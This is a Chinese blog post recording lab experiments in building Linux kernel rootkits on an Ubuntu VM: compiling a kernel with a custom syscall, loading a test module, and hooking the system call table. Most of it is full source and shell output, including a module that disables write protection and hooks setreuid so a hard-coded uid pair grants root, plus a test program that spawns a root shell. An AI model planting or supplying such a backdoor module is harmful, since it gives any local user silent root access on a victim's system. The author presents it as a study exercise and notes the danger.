<h1 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h1><p>建议不要在物理机下实验~因此我根据<a href="https://chirath02.wordpress.com/tag/asmlinkage/">这里</a>介绍的情况便去ubuntu的官方网站下载了ubuntu 15.10的i386镜像。然后用VMWare安装ISO，便开始按照里面的指令进行修改和编译。其中增加的系统调用是根据上述的<a href="http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655113676&idx=3&sn=07e450fb7553f87fa3c9fa5fd186c5b0&chksm=bc864c238bf1c5350ddc594555f4412faa42df025d49e2364884b851d7ea9a1e2d1cfda697d4#rd">r00tk1t</a>增加的。修改系统调用是主要的方式之一，因此可以借鉴。</p>
<h1 id="编译部分"><a href="#编译部分" class="headerlink" title="编译部分"></a>编译部分</h1><p>为了方便可以直接在虚拟机里面切换到root用户，然后键入<code># apt-get source linux-image-$(uname -r)</code>即可下载虚拟机本内核源代码。然后cp到/usr/src目录，再解压出来。然后安装编译所需要的一些依赖工具。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo apt-get update</span><br><span class="line">$ sudo apt-get build-dep linux-image-$(uname -r)</span><br><span class="line">$ sudo apt-get install kernel-package  <span class="comment"># for make-kpkg clean</span></span><br><span class="line">$ sudo apt-get install libncurses-dev  <span class="comment"># for make menuconfig</span></span><br></pre></td></tr></table></figure>
<p>再之后按照教程部分增加系统调用，照葫芦画瓢。然后就<code>make menuconfig</code>配置内核编译选项，教程给的是默认(不知道修改是否编译快一些)。而后便可以开始漫长的编译过程了。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo make</span><br><span class="line">sudo make modules_install˖</span><br><span class="line">sudo make install</span><br><span class="line">sudo mkinitramfs -o /boot/initrd.img-2.6.32.65</span><br><span class="line">sudo update-initramfs -c -k 2.6.32.65</span><br><span class="line">sudo update-grub2 </span><br><span class="line"></span><br><span class="line">sudo vim /etc/default/grub     //注释掉下面的部分</span><br><span class="line"><span class="comment">#GRUB_HIDDEN_TIMEOUT=0</span></span><br><span class="line">sudo update-grub2 </span><br></pre></td></tr></table></figure>
<p>上述参考mallocfree的教程。可以使得不用完全覆盖掉原有内核选项而使得grub增加新的选项来供用户选择。<br>按照教程第一部分部分结果如下:至少我们工程的从内核任务链表中实现了相应的功能。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@r00t:~<span class="comment"># uname -r</span></span><br><span class="line">4.2.2</span><br><span class="line">root@r00t:~<span class="comment"># ps aux | grep sshd</span></span><br><span class="line">root       655  0.0  0.5  10432  5320 ?        Ss   20:13   0:00 /usr/sbin/sshd -D</span><br><span class="line">root      1144  0.0  0.6  13652  6268 ?        Ss   20:13   0:00 sshd: r00t [priv]   </span><br><span class="line">r00t      1209  0.1  0.2  13652  2948 ?        S    20:13   0:00 sshd: r00t@pts/8    </span><br><span class="line">root      1248  0.0  0.6  13652  6196 ?        Ss   20:14   0:00 sshd: r00t [priv]   </span><br><span class="line">r00t      1285  0.0  0.2  13652  2960 ?        S    20:14   0:00 sshd: r00t@pts/9    </span><br><span class="line">root      1330  0.0  0.2   5972  2308 pts/8    S+   20:19   0:00 grep --color=auto sshd</span><br><span class="line">root@r00t:~<span class="comment"># ./testPname </span></span><br><span class="line">Enter process to find</span><br><span class="line">sshd</span><br><span class="line">PID = 655</span><br><span class="line">         PID = 1144</span><br><span class="line">                   PID = 1209</span><br><span class="line">                             PID = 1248</span><br><span class="line">                                       PID = 1285</span><br><span class="line">                                                 System call returned 0</span><br><span class="line">root@r00t:~<span class="comment"># </span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h1 id="LKM"><a href="#LKM" class="headerlink" title="LKM"></a>LKM</h1><p>按照freebuf的教程第一个LKM程序编译如下:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@r00t:~/LKM<span class="comment"># make</span></span><br><span class="line">make -C /lib/modules/4.2.2/build SUBDIRS=/root/LKM modules</span><br><span class="line">make[1]: Entering directory <span class="string">&#x27;/usr/src/linux-4.2.2&#x27;</span></span><br><span class="line">  CC [M]  /root/LKM/lkm.o</span><br><span class="line">  Building modules, stage 2.</span><br><span class="line">  MODPOST 1 modules</span><br><span class="line">  CC      /root/LKM/lkm.mod.o</span><br><span class="line">  LD [M]  /root/LKM/lkm.ko</span><br><span class="line">make[1]: Leaving directory <span class="string">&#x27;/usr/src/linux-4.2.2&#x27;</span></span><br><span class="line">root@r00t:~/LKM<span class="comment"># insmod lkm.ko </span></span><br><span class="line">root@r00t:~/LKM<span class="comment"># dmesg | tail -n 1</span></span><br><span class="line">[ 4019.602327] Arciryas:module loaded</span><br><span class="line">root@r00t:~/LKM<span class="comment"># lsmod | grep lkm</span></span><br><span class="line">lkm                    16384  0</span><br><span class="line">root@r00t:~/LKM<span class="comment"># rmmod lkm.ko</span></span><br><span class="line">root@r00t:~/LKM<span class="comment"># dmesg | tail -n 2</span></span><br><span class="line">[ 4019.602327] Arciryas:module loaded</span><br><span class="line">[ 4117.988381] Arciryas:module removed</span><br><span class="line">root@r00t:~/LKM<span class="comment"># </span></span><br></pre></td></tr></table></figure>

<h1 id="Kernel-Hook"><a href="#Kernel-Hook" class="headerlink" title="Kernel Hook"></a>Kernel Hook</h1><ul>
<li>静态的方式获得syscall表的地址<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@r00t:~<span class="comment"># !cat</span></span><br><span class="line">cat /boot/System.map-4.2.2 | grep sys_call_table</span><br><span class="line">c1755140 R sys_call_table</span><br><span class="line">root@r00t:~<span class="comment"># </span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
<li>hook代码如下,稍微大概解释以下，内核模块在初始化的时候会检查sys_call_table的内存地址是否可写，一般情况下肯定是不能写的，上面的System.map文件中也看到的，因此程序会检查并通过改写其对应的内存页读写属性来强行修改表借此来hook。在模块卸载的时候又将原来的地址修改回来。<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">root@r00t:~/LKM/pname<span class="comment"># cat captainhook.c</span></span><br><span class="line"><span class="comment">#include &lt;asm/unistd.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;asm/cacheflush.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;linux/init.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;linux/module.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;linux/kernel.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;linux/syscalls.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;asm/pgtable_types.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;linux/highmem.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;linux/fs.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;linux/sched.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;linux/moduleparam.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;linux/unistd.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;asm/cacheflush.h&gt;</span></span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br><span class="line">MODULE_AUTHOR(<span class="string">&quot;rutk1t0r&quot;</span>);</span><br><span class="line">/*MY sys_call_table address*/</span><br><span class="line">//c1755140</span><br><span class="line">void **system_call_table_addr;</span><br><span class="line">/*my custom syscall that takes process name*/</span><br><span class="line">asmlinkage int (*custom_syscall) (char* name);</span><br><span class="line">/*hook*/</span><br><span class="line">asmlinkage int captain_hook(char* play_here) &#123;</span><br><span class="line">    /*<span class="keyword">do</span> whatever here (<span class="built_in">print</span> <span class="string">&quot;HAHAHA&quot;</span>, reverse their string, etc)</span><br><span class="line">        But <span class="keyword">for</span> now we will just <span class="built_in">print</span> to the dmesg <span class="built_in">log</span>*/</span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;Pname Syscall:HOOK! HOOK! HOOK! HOOK!...ROOOFFIIOO!&quot;</span>);</span><br><span class="line">    <span class="built_in">return</span> custom_syscall(play_here);</span><br><span class="line">&#125;</span><br><span class="line">/*Make page writeable*/</span><br><span class="line">int make_rw(unsigned long address)&#123;</span><br><span class="line">    unsigned int level;</span><br><span class="line">    pte_t *pte = lookup_address(address, &amp;level);</span><br><span class="line">    <span class="keyword">if</span>(pte-&gt;pte &amp;~_PAGE_RW)&#123;</span><br><span class="line">        pte-&gt;pte |=_PAGE_RW;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">return</span> 0;</span><br><span class="line">&#125;</span><br><span class="line">/* Make the page write protected */</span><br><span class="line">int make_ro(unsigned long address)&#123;</span><br><span class="line">    unsigned int level;</span><br><span class="line">    pte_t *pte = lookup_address(address, &amp;level);</span><br><span class="line">    pte-&gt;pte = pte-&gt;pte &amp;~_PAGE_RW;</span><br><span class="line">    <span class="built_in">return</span> 0;</span><br><span class="line">&#125;</span><br><span class="line">static int __init entry_point(void)&#123;</span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;Captain Hook loaded successfully..\n&quot;</span>);</span><br><span class="line">    /*MY sys_call_table address*/</span><br><span class="line">    system_call_table_addr = (void*)0xc1755140;</span><br><span class="line">    /* Replace custom syscall with the correct system call name (write,open,etc) to hook*/</span><br><span class="line">    custom_syscall = system_call_table_addr[__NR_pname];</span><br><span class="line">    /*Disable page protection*/</span><br><span class="line">    make_rw((unsigned long)system_call_table_addr);</span><br><span class="line">    /*Change syscall to our syscall <span class="keyword">function</span>*/</span><br><span class="line">    system_call_table_addr[__NR_pname] = captain_hook;</span><br><span class="line">    <span class="built_in">return</span> 0;</span><br><span class="line">&#125;</span><br><span class="line">static int __exit exit_point(void)&#123;</span><br><span class="line">        printk(KERN_INFO <span class="string">&quot;Unloaded Captain Hook successfully\n&quot;</span>);</span><br><span class="line">    /*Restore original system call */</span><br><span class="line">    system_call_table_addr[__NR_pname] = custom_syscall;</span><br><span class="line">    /*Renable page protection*/</span><br><span class="line">    make_ro((unsigned long)system_call_table_addr);</span><br><span class="line">    <span class="built_in">return</span> 0;</span><br><span class="line">&#125;</span><br><span class="line">module_init(entry_point);</span><br><span class="line">module_exit(exit_point);</span><br></pre></td></tr></table></figure></li>
<li>结果如下:<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@r00t:~/LKM/pname<span class="comment"># insmod captainhook.ko</span></span><br><span class="line">root@r00t:~/LKM/pname<span class="comment"># cd</span></span><br><span class="line">root@r00t:~<span class="comment"># ./testPname </span></span><br><span class="line">Enter process to find</span><br><span class="line">sshd</span><br><span class="line">PID = 655</span><br><span class="line">         PID = 1144</span><br><span class="line">                   PID = 1209</span><br><span class="line">                             PID = 1248</span><br><span class="line">                                       PID = 1285</span><br><span class="line">                                                 System call returned 0</span><br><span class="line">root@r00t:~<span class="comment"># rmmod captainhook</span></span><br><span class="line">root@r00t:~<span class="comment"># </span></span><br><span class="line"></span><br><span class="line"><span class="comment">## dmesg中输出如下:</span></span><br><span class="line">[ 1月13 21:49] Captain Hook loaded successfully..</span><br><span class="line">[ 1月13 21:50] Pname Syscall:HOOK! HOOK! HOOK! HOOK!...ROOOFFIIOO!</span><br><span class="line">[ +11.875845] Unloaded Captain Hook successfully</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h1 id="动态获取系统调用表"><a href="#动态获取系统调用表" class="headerlink" title="动态获取系统调用表"></a>动态获取系统调用表</h1>依照<a href="https://memset.wordpress.com/2011/01/20/syscall-hijacking-dynamically-obtain-syscall-table-address-kernel-2-6-x/">这篇文章</a>复制过来的代码以及编译运行的结果如下,对于我的虚拟机ubuntu 15.10的4.2.2的内核而言，我修改了模块代码的两个地方(因为这两个地方报错)。第一处是kmalloc和kfree函数未实现，因此加入<code>#include &lt;linux/slab.h&gt;</code>头文件即可。第二处是new结构体指针的uid和gid几个字段赋值强转失败，查看源码后改为宏<code>GLOBAL_ROOT_UID</code>和<code>GLOBAL_ROOT_GID</code>即可。而以下代码的大体意思就是动态地在模块被加载的时候hook掉setreuid系统调用，硬编码写死一个触发条件<code>if ((ruid == 7310) &amp;&amp; (euid == 0137))</code>即应用层传递过来的参数如果满足即可根据cred来获取root权限。因此如果被种植类似这样的后门是很危险的，只要低权限账户运行test程序即可获取root权限。<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">r00t@r00t:~/Linux_kernel/LKM/Dynamical_Get_SysCallTable$ ls</span><br><span class="line">kernel_sys.c  Makefile  test.c</span><br><span class="line">r00t@r00t:~/Linux_kernel/LKM/Dynamical_Get_SysCallTable$ cat kernel_sys.c </span><br><span class="line"><span class="comment">#include &lt;linux/init.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;linux/kernel.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;linux/module.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;linux/proc_fs.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;linux/syscalls.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;linux/kallsyms.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;linux/sched.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;asm/uaccess.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;asm/unistd.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;linux/kernel.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;linux/init.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;linux/module.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;linux/syscalls.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;linux/file.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;linux/fs.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;linux/fcntl.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;asm/uaccess.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;linux/version.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;linux/syscalls.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;linux/slab.h&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#define PROC_V          &quot;/proc/version&quot;</span></span><br><span class="line"><span class="comment">#define BOOT_PATH       &quot;/boot/System.map-&quot;</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#define MAX_LEN         256</span></span><br><span class="line"> </span><br><span class="line">unsigned long *syscall_table; </span><br><span class="line">int sys_found = 0;</span><br><span class="line"> </span><br><span class="line">asmlinkage int (* orig_setreuid) (uid_t ruid, uid_t euid);</span><br><span class="line"> </span><br><span class="line">asmlinkage int new_setreuid (uid_t ruid, uid_t euid) &#123;</span><br><span class="line"> </span><br><span class="line">    struct cred *new;</span><br><span class="line"> </span><br><span class="line">     <span class="keyword">if</span> ((ruid == 7310) &amp;&amp; (euid == 0137))   &#123;</span><br><span class="line"> </span><br><span class="line">         printk(KERN_ALERT <span class="string">&quot;[Correct] \n&quot;</span>);</span><br><span class="line"> </span><br><span class="line">        <span class="comment">#if LINUX_VERSION_CODE &lt; KERNEL_VERSION(2, 6, 29)    </span></span><br><span class="line">                                 </span><br><span class="line">            current-&gt;uid = current -&gt; gid = 0;</span><br><span class="line">            current -&gt; euid = current -&gt; egid = 0;</span><br><span class="line">            current -&gt; suid = current -&gt; sgid = 0;</span><br><span class="line">            current -&gt; fsuid = current -&gt; fsgid = 0;</span><br><span class="line"> </span><br><span class="line">        <span class="comment">#else</span></span><br><span class="line"> </span><br><span class="line">            new = prepare_creds();</span><br><span class="line"> </span><br><span class="line">            <span class="keyword">if</span> ( new != NULL ) &#123;</span><br><span class="line"> </span><br><span class="line">                new-&gt;uid = GLOBAL_ROOT_UID;</span><br><span class="line">		new-&gt;gid = GLOBAL_ROOT_GID;</span><br><span class="line">                new-&gt;euid = GLOBAL_ROOT_UID;</span><br><span class="line">		new-&gt;egid = GLOBAL_ROOT_GID;</span><br><span class="line">                new-&gt;suid = GLOBAL_ROOT_UID;</span><br><span class="line">		new-&gt;sgid = GLOBAL_ROOT_GID;</span><br><span class="line">                new-&gt;fsuid = GLOBAL_ROOT_UID;</span><br><span class="line">		new-&gt;fsgid = GLOBAL_ROOT_GID;</span><br><span class="line"> </span><br><span class="line">                commit_creds(new);</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="comment">#endif</span></span><br><span class="line"> </span><br><span class="line">         <span class="built_in">return</span> orig_setreuid (0, 0);</span><br><span class="line">     &#125;</span><br><span class="line"> </span><br><span class="line">     <span class="built_in">return</span> orig_setreuid (ruid, euid);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">char *search_file(char *buf) &#123;</span><br><span class="line">     </span><br><span class="line">    struct file *f;</span><br><span class="line">    char *ver;</span><br><span class="line">    mm_segment_t oldfs;</span><br><span class="line"> </span><br><span class="line">    oldfs = get_fs();</span><br><span class="line">    set_fs (KERNEL_DS);</span><br><span class="line">     </span><br><span class="line">    f = filp_open(PROC_V, O_RDONLY, 0);</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">if</span> ( IS_ERR(f) || ( f == NULL )) &#123;</span><br><span class="line">     </span><br><span class="line">        <span class="built_in">return</span> NULL;</span><br><span class="line">     </span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    memset(buf, 0, MAX_LEN);</span><br><span class="line">     </span><br><span class="line">    vfs_read(f, buf, MAX_LEN, &amp;f-&gt;f_pos);</span><br><span class="line">     </span><br><span class="line">    ver = strsep(&amp;buf, <span class="string">&quot; &quot;</span>);</span><br><span class="line">    ver = strsep(&amp;buf, <span class="string">&quot; &quot;</span>);</span><br><span class="line">    ver = strsep(&amp;buf, <span class="string">&quot; &quot;</span>);</span><br><span class="line">         </span><br><span class="line">    filp_close(f, 0);   </span><br><span class="line">    set_fs(oldfs);</span><br><span class="line">     </span><br><span class="line">    <span class="built_in">return</span> ver;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">static int find_sys_call_table (char *kern_ver)</span><br><span class="line"> &#123;</span><br><span class="line"> </span><br><span class="line">    char buf[MAX_LEN];</span><br><span class="line">    int i = 0;</span><br><span class="line">    char *filename;</span><br><span class="line">    char *p;</span><br><span class="line">    struct file *f = NULL;</span><br><span class="line"> </span><br><span class="line">    mm_segment_t oldfs;</span><br><span class="line"> </span><br><span class="line">    oldfs = get_fs();</span><br><span class="line">    set_fs (KERNEL_DS);</span><br><span class="line">     </span><br><span class="line">    filename = kmalloc(strlen(kern_ver)+strlen(BOOT_PATH)+1, GFP_KERNEL);</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">if</span> ( filename == NULL ) &#123;</span><br><span class="line">     </span><br><span class="line">        <span class="built_in">return</span> -1;</span><br><span class="line">     </span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    memset(filename, 0, strlen(BOOT_PATH)+strlen(kern_ver)+1);</span><br><span class="line">     </span><br><span class="line">    strncpy(filename, BOOT_PATH, strlen(BOOT_PATH));</span><br><span class="line">    strncat(filename, kern_ver, strlen(kern_ver));</span><br><span class="line">     </span><br><span class="line">    printk(KERN_ALERT <span class="string">&quot;\nPath %s\n&quot;</span>, filename);</span><br><span class="line">     </span><br><span class="line">    f = filp_open(filename, O_RDONLY, 0);</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">if</span> ( IS_ERR(f) || ( f == NULL )) &#123;</span><br><span class="line">     </span><br><span class="line">        <span class="built_in">return</span> -1;</span><br><span class="line">     </span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    memset(buf, 0x0, MAX_LEN);</span><br><span class="line"> </span><br><span class="line">    p = buf;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">while</span> (vfs_read(f, p+i, 1, &amp;f-&gt;f_pos) == 1) &#123;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> ( p[i] == <span class="string">&#x27;\n&#x27;</span> || i == 255 ) &#123;</span><br><span class="line">         </span><br><span class="line">            i = 0;</span><br><span class="line">             </span><br><span class="line">            <span class="keyword">if</span> ( (strstr(p, <span class="string">&quot;sys_call_table&quot;</span>)) != NULL ) &#123;</span><br><span class="line">                 </span><br><span class="line">                char *sys_string;</span><br><span class="line">                 </span><br><span class="line">                sys_string = kmalloc(MAX_LEN, GFP_KERNEL);  </span><br><span class="line">                 </span><br><span class="line">                <span class="keyword">if</span> ( sys_string == NULL ) &#123; </span><br><span class="line">                 </span><br><span class="line">                    filp_close(f, 0);</span><br><span class="line">                    set_fs(oldfs);</span><br><span class="line">     </span><br><span class="line">                    kfree(filename);</span><br><span class="line">     </span><br><span class="line">                    <span class="built_in">return</span> -1;</span><br><span class="line">     </span><br><span class="line">                &#125;</span><br><span class="line"> </span><br><span class="line">                memset(sys_string, 0, MAX_LEN);</span><br><span class="line">                strncpy(sys_string, strsep(&amp;p, <span class="string">&quot; &quot;</span>), MAX_LEN);</span><br><span class="line">             </span><br><span class="line">                syscall_table = (unsigned long long *) simple_strtoll(sys_string, NULL, 16);</span><br><span class="line">                 </span><br><span class="line">                kfree(sys_string);</span><br><span class="line">                 </span><br><span class="line">                <span class="built_in">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">             </span><br><span class="line">            memset(buf, 0x0, MAX_LEN);</span><br><span class="line">            <span class="built_in">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">         </span><br><span class="line">        i++;</span><br><span class="line">     </span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    filp_close(f, 0);</span><br><span class="line">    set_fs(oldfs);</span><br><span class="line">     </span><br><span class="line">    kfree(filename);</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">return</span> 0;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">static int init(void) &#123;</span><br><span class="line"> </span><br><span class="line">    char *kern_ver;</span><br><span class="line">    char *buf;</span><br><span class="line">     </span><br><span class="line">    buf = kmalloc(MAX_LEN, GFP_KERNEL);</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">if</span> ( buf == NULL ) &#123;</span><br><span class="line">     </span><br><span class="line">        sys_found = 1;</span><br><span class="line">        <span class="built_in">return</span> -1;</span><br><span class="line">     </span><br><span class="line">    &#125;   </span><br><span class="line"> </span><br><span class="line">    printk(KERN_ALERT <span class="string">&quot;\nHIJACK INIT\n&quot;</span>);</span><br><span class="line"> </span><br><span class="line">    kern_ver = search_file(buf);</span><br><span class="line">         </span><br><span class="line">    <span class="keyword">if</span> ( kern_ver == NULL ) &#123;</span><br><span class="line"> </span><br><span class="line">        sys_found = 1;</span><br><span class="line">        <span class="built_in">return</span> -1;</span><br><span class="line">     </span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    printk(KERN_ALERT <span class="string">&quot;Kernel version found: %s\n&quot;</span>, kern_ver);</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">if</span> ( find_sys_call_table(kern_ver) == -1 ) &#123;</span><br><span class="line">     </span><br><span class="line">        sys_found = 1;</span><br><span class="line">        <span class="built_in">return</span> -1;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    sys_found = 0;</span><br><span class="line">     </span><br><span class="line">    write_cr0 (read_cr0 () &amp; (~ 0x10000));</span><br><span class="line">     </span><br><span class="line">    orig_setreuid = syscall_table[__NR_setreuid32];</span><br><span class="line">    syscall_table[__NR_setreuid32] = new_setreuid;</span><br><span class="line"> </span><br><span class="line">    write_cr0 (read_cr0 () | 0x10000);</span><br><span class="line">     </span><br><span class="line">    kfree(buf);</span><br><span class="line">     </span><br><span class="line">    <span class="built_in">return</span> 0;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">static void <span class="built_in">exit</span>(void) &#123;</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">if</span> ( sys_found == 0 ) &#123;</span><br><span class="line">     </span><br><span class="line">        write_cr0 (read_cr0 () &amp; (~ 0x10000));</span><br><span class="line"> </span><br><span class="line">        syscall_table[__NR_setreuid32] = orig_setreuid;</span><br><span class="line"> </span><br><span class="line">        write_cr0 (read_cr0 () | 0x10000);</span><br><span class="line">     </span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    printk(KERN_ALERT <span class="string">&quot;\nHIJACK EXIT\n&quot;</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">module_init(init);</span><br><span class="line">module_exit(<span class="built_in">exit</span>);</span><br><span class="line">r00t@r00t:~/Linux_kernel/LKM/Dynamical_Get_SysCallTable$ make</span><br><span class="line">make -C /lib/modules/4.2.2/build SUBDIRS=/home/r00t/Linux_kernel/LKM/Dynamical_Get_SysCallTable modules</span><br><span class="line">make[1]: Entering directory <span class="string">&#x27;/usr/src/linux-4.2.2&#x27;</span></span><br><span class="line">  CC [M]  /home/r00t/Linux_kernel/LKM/Dynamical_Get_SysCallTable/kernel_sys.o</span><br><span class="line">/home/r00t/Linux_kernel/LKM/Dynamical_Get_SysCallTable/kernel_sys.c: In <span class="keyword">function</span> ‘find_sys_call_table’:</span><br><span class="line">/home/r00t/Linux_kernel/LKM/Dynamical_Get_SysCallTable/kernel_sys.c:171:33: warning: cast to pointer from <span class="built_in">integer</span> of different size [-Wint-to-pointer-cast]</span><br><span class="line">                 syscall_table = (unsigned long long *) simple_strtoll(sys_string, NULL, 16);</span><br><span class="line">                                 ^</span><br><span class="line">/home/r00t/Linux_kernel/LKM/Dynamical_Get_SysCallTable/kernel_sys.c:171:31: warning: assignment from incompatible pointer <span class="built_in">type</span> [-Wincompatible-pointer-types]</span><br><span class="line">                 syscall_table = (unsigned long long *) simple_strtoll(sys_string, NULL, 16);</span><br><span class="line">                               ^</span><br><span class="line">/home/r00t/Linux_kernel/LKM/Dynamical_Get_SysCallTable/kernel_sys.c: In <span class="keyword">function</span> ‘init’:</span><br><span class="line">/home/r00t/Linux_kernel/LKM/Dynamical_Get_SysCallTable/kernel_sys.c:231:19: warning: assignment makes pointer from <span class="built_in">integer</span> without a cast [-Wint-conversion]</span><br><span class="line">     orig_setreuid = syscall_table[__NR_setreuid32];</span><br><span class="line">                   ^</span><br><span class="line">/home/r00t/Linux_kernel/LKM/Dynamical_Get_SysCallTable/kernel_sys.c:232:36: warning: assignment makes <span class="built_in">integer</span> from pointer without a cast [-Wint-conversion]</span><br><span class="line">     syscall_table[__NR_setreuid32] = new_setreuid;</span><br><span class="line">                                    ^</span><br><span class="line">/home/r00t/Linux_kernel/LKM/Dynamical_Get_SysCallTable/kernel_sys.c: In <span class="keyword">function</span> ‘<span class="built_in">exit</span>’:</span><br><span class="line">/home/r00t/Linux_kernel/LKM/Dynamical_Get_SysCallTable/kernel_sys.c:247:40: warning: assignment makes <span class="built_in">integer</span> from pointer without a cast [-Wint-conversion]</span><br><span class="line">         syscall_table[__NR_setreuid32] = orig_setreuid;</span><br><span class="line">                                        ^</span><br><span class="line">  Building modules, stage 2.</span><br><span class="line">  MODPOST 1 modules</span><br><span class="line">  CC      /home/r00t/Linux_kernel/LKM/Dynamical_Get_SysCallTable/kernel_sys.mod.o</span><br><span class="line">  LD [M]  /home/r00t/Linux_kernel/LKM/Dynamical_Get_SysCallTable/kernel_sys.ko</span><br><span class="line">make[1]: Leaving directory <span class="string">&#x27;/usr/src/linux-4.2.2&#x27;</span></span><br><span class="line">r00t@r00t:~/Linux_kernel/LKM/Dynamical_Get_SysCallTable$ cat test.c </span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"> </span><br><span class="line">int <span class="function"><span class="title">main</span></span> () &#123;</span><br><span class="line"> </span><br><span class="line">        setreuid (7310, 0137);</span><br><span class="line">        system (<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line"> </span><br><span class="line">        <span class="built_in">return</span> 0;</span><br><span class="line">&#125;</span><br><span class="line">r00t@r00t:~/Linux_kernel/LKM/Dynamical_Get_SysCallTable$ id</span><br><span class="line">uid=1000(r00t) gid=1000(r00t) groups=1000(r00t),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)</span><br><span class="line">r00t@r00t:~/Linux_kernel/LKM/Dynamical_Get_SysCallTable$ ls</span><br><span class="line">kernel_sys.c   kernel_sys.mod.c  kernel_sys.o  modules.order   test.c</span><br><span class="line">kernel_sys.ko  kernel_sys.mod.o  Makefile      Module.symvers</span><br><span class="line">r00t@r00t:~/Linux_kernel/LKM/Dynamical_Get_SysCallTable$ sudo insmod kernel_sys.ko</span><br><span class="line">r00t@r00t:~/Linux_kernel/LKM/Dynamical_Get_SysCallTable$ dmesg | tail -n 4</span><br><span class="line">               HIJACK INIT</span><br><span class="line">[ 2537.374798] Kernel version found: 4.2.2</span><br><span class="line">[ 2537.374802] </span><br><span class="line">               Path /boot/System.map-4.2.2</span><br><span class="line">r00t@r00t:~/Linux_kernel/LKM/Dynamical_Get_SysCallTable$ gcc -o <span class="built_in">test</span> test.c </span><br><span class="line">test.c: In <span class="keyword">function</span> ‘main’:</span><br><span class="line">test.c:5:9: warning: implicit declaration of <span class="keyword">function</span> ‘setreuid’ [-Wimplicit-function-declaration]</span><br><span class="line">         setreuid (7310, 0137);</span><br><span class="line">         ^</span><br><span class="line">test.c:6:9: warning: implicit declaration of <span class="keyword">function</span> ‘system’ [-Wimplicit-function-declaration]</span><br><span class="line">         system (<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">         ^</span><br><span class="line">r00t@r00t:~/Linux_kernel/LKM/Dynamical_Get_SysCallTable$ ./<span class="built_in">test</span> </span><br><span class="line"><span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) 